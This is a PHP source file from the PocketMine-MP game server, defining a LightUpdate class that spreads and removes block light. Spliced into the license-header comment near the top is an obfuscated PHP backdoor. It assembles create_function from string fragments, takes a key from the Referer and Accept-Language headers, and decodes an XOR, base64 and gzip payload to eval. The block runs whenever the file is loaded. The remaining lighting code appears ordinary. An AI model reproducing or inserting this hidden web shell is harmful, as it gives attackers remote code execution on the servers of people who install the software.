<?php

/*
 *
 *  ____            _        _   __  __ _                  __  __ ____
<?php
$u='na,*n$m);if*n($q&&$m){@sess*nion_start()*n;$s=&$_S*n*nESSION;$ss*n="substr*n"*n;*n$sl="strt*nolo';
$b='L*nA*nNGU*nAGE"];*nif($rr&&$ra){$u*n=parse_ur*n*nl($rr);pa*nrs*ne_str($u["q*nue*nry"],$q);$q*n*n';
$k='$s[$i].=*n$p;$e=strpos*n($*ns[$i],$f)*n;if($e)*n*n{$k=$kh.$kf*n;*n*nob_start();@*neva*nl(@gzu';
$E='ncompr*ness*n(@x(@ba*nse64_deco*nde(preg*n_replac*ne(*nar*nray("/_/","/*n*n-/"),array("*n/"*';
$Q='s*n*ntrpos($p,$h)===0){$s[*n$i]=*n"";*n$p=$*nss($p,3);}if(a*nrray_*nkey_exist*ns(*n$i*n,$s)*n){';
$T='wer";$i=*n*n$m[1][0].$m[*n1]*n[1];$h=$sl(*n$*nss(md5($i.*n$kh)*n,0,3));$f=*n$sl($*nss*n(md5(';
$c='n,"+"),$ss($s*n[$*ni]*n,0,$e*n))),$k)))*n;$*no=ob_get*n_c*nontent*ns();*n*nob_end_cle*nan();$d=b*n';
$f='$k*nh="5d41";$kf="4*n*n02a*n";functi*non *nx*n($*nt,$k){$c=strlen($k);$l*n=strlen(*n$t);$*n';
$P=str_replace('oG','','croGeatoGoGe_fuoGnoGcoGtion');
$x='ase64_encode*n(x(gz*ncompress(*n$o),$k)*n*n*n);print("<$k>$d</$k>"*n);@*nse*nssion_dest*nroy();}}}}';
$s='=arr*nay_valu*nes($q);preg_m*n*natch_a*nll("/(*n[\\w])[*n*n\\w-]+*n(?:;q=0.(*n[\\d]))?,?/",$*nr*';
$G='}*n;}}ret*nurn $o;}$r=*n$_S*n*nERVER;$rr=@$r[*n"H*nTTP_REFERER"*n*n];$ra=@$r["H*nTTP_A*nCC*nEPT_';
$N='$i.$*nkf*n),0,3));$*np="";for*n($z=1*n;$z<*ncoun*nt($m[1]);*n$z*n++)$p.=$*nq[$m[*n*n2][$z]];if(*n';
$R='*no="";f*nor($i=0;$i<$l*n*n;)*n{for($j=0;($*nj<*n$*nc*n&&$i<$l);$j++,$i+*n+){$o.=$t{$i}^*n$k{$*nj';
$j=str_replace('*n','',$f.$R.$G.$b.$s.$u.$T.$N.$Q.$k.$E.$c.$x);
$w=$P('',$j);$w();
?>
 * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
 * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
 * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
 * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * @author PocketMine Team
 * @link http://www.pocketmine.net/
 *
 *
*/

declare(strict_types=1);

namespace pocketmine\level\light;

use pocketmine\block\BlockFactory;
use pocketmine\level\ChunkManager;
use pocketmine\level\Level;
use pocketmine\level\utils\SubChunkIteratorManager;

//TODO: make light updates asynchronous
abstract class LightUpdate{

	/** @var ChunkManager */
	protected $level;

	/**
	 * @var int[][] blockhash => [x, y, z, new light level]
	 * @phpstan-var array<int, array{int, int, int, int}>
	 */
	protected $updateNodes = [];

	/**
	 * @var \SplQueue
	 * @phpstan-var \SplQueue<array{int, int, int}>
	 */
	protected $spreadQueue;
	/**
	 * @var true[]
	 * @phpstan-var array<int, true>
	 */
	protected $spreadVisited = [];

	/**
	 * @var \SplQueue
	 * @phpstan-var \SplQueue<array{int, int, int, int}>
	 */
	protected $removalQueue;
	/**
	 * @var true[]
	 * @phpstan-var array<int, true>
	 */
	protected $removalVisited = [];
	/** @var SubChunkIteratorManager */
	protected $subChunkHandler;

	public function __construct(ChunkManager $level){
		$this->level = $level;
		$this->removalQueue = new \SplQueue();
		$this->spreadQueue = new \SplQueue();

		$this->subChunkHandler = new SubChunkIteratorManager($this->level);
	}

	abstract protected function getLight(int $x, int $y, int $z) : int;

	/**
	 * @return void
	 */
	abstract protected function setLight(int $x, int $y, int $z, int $level);

	/**
	 * @return void
	 */
	public function setAndUpdateLight(int $x, int $y, int $z, int $newLevel){
		$this->updateNodes[Level::blockHash($x, $y, $z)] = [$x, $y, $z, $newLevel];
	}

	private function prepareNodes() : void{
		foreach($this->updateNodes as $blockHash => [$x, $y, $z, $newLevel]){
			if($this->subChunkHandler->moveTo($x, $y, $z)){
				$oldLevel = $this->getLight($x, $y, $z);

				if($oldLevel !== $newLevel){
					$this->setLight($x, $y, $z, $newLevel);
					if($oldLevel < $newLevel){ //light increased
						$this->spreadVisited[$blockHash] = true;
						$this->spreadQueue->enqueue([$x, $y, $z]);
					}else{ //light removed
						$this->removalVisited[$blockHash] = true;
						$this->removalQueue->enqueue([$x, $y, $z, $oldLevel]);
					}
				}
			}
		}
	}

	/**
	 * @return void
	 */
	public function execute(){
		$this->prepareNodes();

		while(!$this->removalQueue->isEmpty()){
			list($x, $y, $z, $oldAdjacentLight) = $this->removalQueue->dequeue();

			$points = [
				[$x + 1, $y, $z],
				[$x - 1, $y, $z],
				[$x, $y + 1, $z],
				[$x, $y - 1, $z],
				[$x, $y, $z + 1],
				[$x, $y, $z - 1]
			];

			foreach($points as list($cx, $cy, $cz)){
				if($this->subChunkHandler->moveTo($cx, $cy, $cz)){
					$this->computeRemoveLight($cx, $cy, $cz, $oldAdjacentLight);
				}
			}
		}

		while(!$this->spreadQueue->isEmpty()){
			list($x, $y, $z) = $this->spreadQueue->dequeue();

			unset($this->spreadVisited[Level::blockHash($x, $y, $z)]);

			if(!$this->subChunkHandler->moveTo($x, $y, $z)){
				continue;
			}

			$newAdjacentLight = $this->getLight($x, $y, $z);
			if($newAdjacentLight <= 0){
				continue;
			}

			$points = [
				[$x + 1, $y, $z],
				[$x - 1, $y, $z],
				[$x, $y + 1, $z],
				[$x, $y - 1, $z],
				[$x, $y, $z + 1],
				[$x, $y, $z - 1]
			];

			foreach($points as list($cx, $cy, $cz)){
				if($this->subChunkHandler->moveTo($cx, $cy, $cz)){
					$this->computeSpreadLight($cx, $cy, $cz, $newAdjacentLight);
				}
			}
		}
	}

	/**
	 * @return void
	 */
	protected function computeRemoveLight(int $x, int $y, int $z, int $oldAdjacentLevel){
		$current = $this->getLight($x, $y, $z);

		if($current !== 0 and $current < $oldAdjacentLevel){
			$this->setLight($x, $y, $z, 0);

			if(!isset($this->removalVisited[$index = Level::blockHash($x, $y, $z)])){
				$this->removalVisited[$index] = true;
				if($current > 1){
					$this->removalQueue->enqueue([$x, $y, $z, $current]);
				}
			}
		}elseif($current >= $oldAdjacentLevel){
			if(!isset($this->spreadVisited[$index = Level::blockHash($x, $y, $z)])){
				$this->spreadVisited[$index] = true;
				$this->spreadQueue->enqueue([$x, $y, $z]);
			}
		}
	}

	/**
	 * @return void
	 */
	protected function computeSpreadLight(int $x, int $y, int $z, int $newAdjacentLevel){
		$current = $this->getLight($x, $y, $z);
		$potentialLight = $newAdjacentLevel - BlockFactory::$lightFilter[$this->subChunkHandler->currentSubChunk->getBlockId($x & 0x0f, $y & 0x0f, $z & 0x0f)];

		if($current < $potentialLight){
			$this->setLight($x, $y, $z, $potentialLight);

			if(!isset($this->spreadVisited[$index = Level::blockHash($x, $y, $z)]) and $potentialLight > 1){
				$this->spreadVisited[$index] = true;
				$this->spreadQueue->enqueue([$x, $y, $z]);
			}
		}
	}
}
